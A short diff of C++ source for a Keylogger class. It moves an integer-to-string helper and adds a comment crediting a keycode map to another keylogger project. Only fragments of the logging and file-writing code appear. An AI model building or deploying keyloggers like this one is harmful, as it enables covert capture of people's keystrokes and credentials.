@@ -32,15 +32,13 @@ std::string Keylogger::DumpKeys()
 	return keys;	
 }
 
-std::string Keylogger::intToString(int i) {
-	char buffer[4];
-	_itoa_s(i, buffer, 10);
-	return std::string(buffer);
-}
 
 
 
-void Keylogger::Logger()
+
+
+
+void Keylogger::Logger()//keycode map taken from https://github.com/TheFox/keylogger/blob/master/src/main.cpp
 {
 
 	std::ofstream file;
@@ -143,4 +141,10 @@ void Keylogger::Logger()
 			file.close();
 		}
 	}
+}
+
+std::string Keylogger::intToString(int i) {
+	char buffer[4];
+	_itoa_s(i, buffer, 10);
+	return std::string(buffer);
 }
